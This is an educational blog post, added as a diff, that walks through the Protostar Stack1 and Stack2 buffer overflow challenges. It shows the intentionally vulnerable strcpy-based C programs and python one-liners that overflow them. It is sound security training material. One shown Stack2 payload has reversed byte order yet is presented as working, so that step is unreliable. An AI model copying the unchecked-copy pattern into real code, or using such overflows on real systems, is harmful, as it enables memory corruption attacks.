@@ -1,0 +1,204 @@
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+<p><br /> So last week I talked about buffer overflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in !
+<img src="/images/binary-exploitation/BOF2/0.png" alt="" />
+<br /> If you haven’t read my previous <a href="/BinaryExploitation-BOF/">post</a> yet I recommend reading it before this.
+<br /></p>
+<hr />
+
+<h2 id="stack1">Stack1</h2>
+<p><br /> For this challenge we got this code :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+ volatile int modified;
+ char buffer[64];
+
+ if(argc == 1) {
+  errx(1, "please specify an argument\n");
+ }
+
+ modified = 0;
+ strcpy(buffer, argv[1]);
+
+ if(modified == 0x61626364) {
+  printf("you have correctly got the variable to the right value\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+}
+</code></pre></div></div>
+<hr />
+
+<h3 id="breakdown">Breakdown</h3>
+<p><br /> So this code :
+<br /> creates a variable called “modified” and assigns a buffer of 64 chars to it.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>volatile int modified; 
+char buffer[64];
+</code></pre></div></div>
+<p><br />
+<br /> Checks if we supplied an argument or not.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> if(argc == 1) {
+  errx(1, "please specify an argument\n");
+ }
+</code></pre></div></div>
+<p><br />
+<br /> Sets the value of the “modified” variable into 0 , then it copies whatever we give it <code class="highlighter-rouge">argv[1]</code> into the buffer of “modified”.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>modified = 0;
+strcpy(buffer, argv[1]);
+</code></pre></div></div>
+<p><br />
+<br /> Then it checks if the variable’s value is <code class="highlighter-rouge">0x61626364</code> or not</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(modified == 0x61626364) {
+  printf("you have correctly got the variable to the right value\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+</code></pre></div></div>
+<p><br /></p>
+<hr />
+
+<h2 id="solution">Solution</h2>
+<p><br /> So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is <code class="highlighter-rouge">0x61626364</code> in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it.
+<br /> Let’s execute stack1 
+<img src="/images/binary-exploitation/BOF2/1.png" alt="" />
+<br /> We get please specify an argument so let’s enter anything.
+<img src="/images/binary-exploitation/BOF2/2.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/binary-exploitation/BOF2/3.png" alt="" />
+<br /> We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b”</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./stack1 `python -c "print ('A' * 64 + 'b')"`
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF2/4.png" alt="" />
+<br /> And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./stack1 `python -c "print ('A' * 64 + 'dcba')"`
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF2/5.png" alt="" />
+<br /> And we did it ! 
+<br /> But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF2/6.png" alt="" />
+<br /></p>
+<hr />
+
+<h2 id="stack2">Stack2</h2>
+<p><br /> For this challenge we got this code :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+ volatile int modified;
+ char buffer[64];
+ char *variable;
+
+ variable = getenv("GREENIE");
+
+ if(variable == NULL) {
+  errx(1, "please set the GREENIE environment variable\n");
+ }
+
+ modified = 0;
+
+ strcpy(buffer, variable);
+
+ if(modified == 0x0d0a0d0a) {
+  printf("you have correctly modified the variable\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+
+}
+</code></pre></div></div>
+<p><br /></p>
+<hr />
+
+<h3 id="breakdown-1">Breakdown</h3>
+<p><br /> This code :
+<br /> As always creates a variable called “modified” and assigns a buffer of 64 chars to it</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>volatile int modified;
+char buffer[64];
+</code></pre></div></div>
+<p><br />
+<br /> The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>variable = getenv("GREENIE");
+</code></pre></div></div>
+<p><br />
+<br /> The program checks if the variable “variable” has a value or not</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(variable == NULL) {
+  errx(1, "please set the GREENIE environment variable\n");
+ }
+</code></pre></div></div>
+<p><br />
+<br /> Sets the value of modified to 0</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>modified = 0;
+</code></pre></div></div>
+<p><br />
+<br /> Then it copies the value of “variable” into the buffer of “modified”</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strcpy(buffer, variable);
+</code></pre></div></div>
+<p><br />
+<br /> After that it checks if the value of “modified” is <code class="highlighter-rouge">0x0d0a0d0a</code> or not</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(modified == 0x0d0a0d0a) {
+  printf("you have correctly modified the variable\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+</code></pre></div></div>
+<hr />
+
+<h2 id="solution-1">Solution</h2>
+<p><br /> So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality.
+<br /> In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”.
+<br /> But wait a minute , what is an environment variable ?</p>
+<hr />
+
+<h3 id="environment-variables">Environment Variables</h3>
+<p><br /> Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example.
+<br /> If we take the environment variable BASH and look at it :
+<img src="/images/binary-exploitation/BOF2/7.png" alt="" />
+<br /> We see that its value is : /bin/bash
+<br /> So for example if I want to run bash I type bash in the terminal instead of <code class="highlighter-rouge">./bin/bash</code> because the system calls the variable BASH and finds its path.
+<br /> But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python 
+<img src="/images/binary-exploitation/BOF2/8.png" alt="" />
+<br /> So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone.
+<br /> <a href="https://en.wikipedia.org/wiki/Environment_variable">More about environment variables</a>
+<br /></p>
+<hr />
+
+<p><br /> Now let’s execute stack2
+<img src="/images/binary-exploitation/BOF2/9.png" alt="" />
+<br /> We get Please set the GREENIE environment variable.
+<br /> There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then <code class="highlighter-rouge">0x0d0a0d0a</code>
+<br /> This time we won’t be able to use the value in ASCII like we did with stack1 because <code class="highlighter-rouge">0x0d</code> is a return <code class="highlighter-rouge">\r</code> and <code class="highlighter-rouge">0x0a</code> is a new line <code class="highlighter-rouge">\n</code> and we can’t type those so we will use the hex values and python will translate them.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GREENIE = `python -c "print ('A' * 64 + '\x0a\x0d\x0a\x0d')"`
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF2/10.png" alt="" />
+<br /> When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return
+<br /> Now we need to export it to the environment variables list then we are good to go.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export GREENIE
+./stack2
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF2/11.png" alt="" />
+<br /> And we did it ! 
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Binary Exploitation article : <a href="/binary-exploitation/bof1/">Binary Exploitation - Buffer Overflow Explained in Detail</a>
+<br /> Next Binary Exploitation article : <a href="/binary-exploitation/bof3/">Buffer Overflow Examples, Overwriting a function pointer - protostar stack3</a></p>
+<hr />
+
